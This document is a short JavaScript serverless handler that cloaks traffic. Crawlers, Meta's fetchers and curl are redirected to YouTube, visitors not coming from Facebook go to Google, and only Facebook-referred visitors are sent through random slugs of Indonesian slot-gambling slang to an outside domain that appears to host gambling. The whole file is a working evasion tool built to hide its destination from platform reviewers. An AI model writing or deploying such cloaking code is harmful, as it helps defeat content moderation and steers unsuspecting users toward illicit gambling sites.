export default async function handler(req, res) {

  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const referer = (req.headers["referer"] || "").toLowerCase();
  const url = new URL(req.url, `https://${req.headers.host}`);
  const path = url.pathname;
  const query = url.search;

  const cookies = req.headers.cookie || "";

  // ===== DETEKSI =====
  const isBot =
    ua.includes("bot") ||
    ua.includes("crawl") ||
    ua.includes("spider") ||
    ua.includes("facebookexternalhit") ||
    ua.includes("meta-externalagent") ||
    ua.includes("curl");

  const isFB =
    referer.includes("facebook");

  // ===== ROOT =====
  if (path === "/") {

    // BOT → YOUTUBE
    if (isBot) {
      return res.writeHead(301, {
        Location: "https://www.youtube.com/" + query
      }).end();
    }

    // NON FB → GOOGLE
    if (!isFB) {
      return res.writeHead(301, {
        Location: "https://www.google.com/" + query
      }).end();
    }

    // ===== CEK COOKIE SLUG =====
    let slug = null;

    if (cookies.includes("slug=")) {
      slug = cookies.split("slug=")[1].split(";")[0];
    }

    // ===== GENERATE SLUG MANUAL STYLE =====
    if (!slug) {

      const words = [
        "pusat","sudah","melakukan","wd","hari","ini",
        "terbukti","gacor","maxwin","langsung","cair"
      ];

      slug = words.sort(() => 0.5 - Math.random())
                  .slice(0, 5)
                  .join("-") + "-" + Math.floor(Math.random() * 9999);
    }

    return res.writeHead(302, {
      Location: "/" + slug + query,
      "Set-Cookie": `slug=${slug}; path=/; max-age=86400`
    }).end();
  }

  // ===== SLUG =====
  if (path !== "/") {

    return res.writeHead(302, {
      Location: "https://hehehe.pusat4daksi.org/" + query
    }).end();
  }
}
